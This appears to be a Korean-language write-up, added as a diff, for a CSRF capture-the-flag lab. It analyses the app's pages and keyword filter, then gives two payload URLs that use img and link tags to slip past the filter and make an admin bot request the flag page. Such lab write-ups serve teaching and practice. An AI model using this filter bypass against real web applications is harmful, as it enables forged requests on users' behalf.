@@ -1,0 +1,25 @@
+Analysis)
+1. vuln(csrf) page  - 전달한 param 파라미터의 값을 출력
+                      파라미터에 frame, script, on 세 가지 키워드가 포함되어 있을 경우 *로 치환
+
+2. memo page        - 전달한 memo 파라미터 값을 기록
+                      render_template 함수를 통해 출력
+
+3. notice flag page - 로컬호스트 (127.0.0.1)에서 접근
+                      userid 파라미터가 admin일 경우 메모에 FLAG를 작성
+                      조건을 만족하지 못하면 접근 제한 메시지가 출력
+                      
+4. flag page.       - GET  : URL을 입력받는 페이지를 제공
+                      POST : param 파라미터 값을 가져와 check_csrf함수의 인자로 넣고 호출
+                             check_csrf 함수는 인자를 다시 CSRF 취약점이 발생하는 URL의 파라미터로 설정하고, read_url 함수를 이용해 해당 URL 방문
+
+5. csrf-1.py
+   1) xss_filter 함수 : XSS 공격을 방지하기 위한 목적                   
+   2) read_url 함수   : 셀레늄을 이용해 URL을 방문
+
+Exploit) 
+1. /admin/notice_flag 페이지를 방문하도록 해야함
+2. userid 파라미터가 admin인지 검사하는 부분이 존재하기 때문에 해당 문자열을 포함
+
+   => 1) http://127.0.0.1:8000/vuln?param=<img src = "/admin/notice_flag?userid=admin">
+      2) http://127.0.0.1:8000/vuln?param=<link rel="stylesheet" href="/admin/notice_flag?userid=admin">
